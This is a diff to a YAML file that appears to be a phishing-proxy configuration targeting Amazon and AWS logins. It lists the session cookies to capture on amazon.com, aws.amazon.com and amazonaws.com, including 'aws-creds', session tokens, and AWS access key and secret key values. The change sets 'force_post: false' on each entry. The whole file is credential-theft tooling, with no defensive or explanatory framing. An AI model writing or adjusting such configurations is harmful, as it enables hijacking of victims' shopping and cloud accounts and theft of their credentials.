@@ -47,27 +47,29 @@ auth_tokens:
   - domain: '.amazon.com'
     keys: ['session-id', 'session-id-time', 'ubid-main', 'x-main', 'at-main', 'sess-at-main', 'sst-main']
     type: 'cookie'
+    force_post: false
   
   - domain: '.amazon.com'
     keys: ['session-token', 'csm-hit', 'lc-main', 'sp-cdn', 'skin']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # AWS Console authentication cookies
   - domain: '.aws.amazon.com'
     keys: ['aws-userInfo', 'aws-creds', 'JSESSIONID', 'aws-ubid-main', 'aws-at-main', 'noflush_awsccs_sid']
     type: 'cookie'
+    force_post: false
   
   - domain: '.aws.amazon.com'
     keys: ['aws_lang', 'awsc-color-theme', 'awsc-uh-opt-in', 'awsc-consoleInfo']
     type: 'cookie'
-    optional: true
+    force_post: false
   
   # AWS session tokens
   - domain: '.amazonaws.com'
     keys: ['aws-session-token', 'aws-access-key-id', 'aws-secret-access-key']
     type: 'cookie'
-    optional: true
+    force_post: false
 
 credentials:
   username:
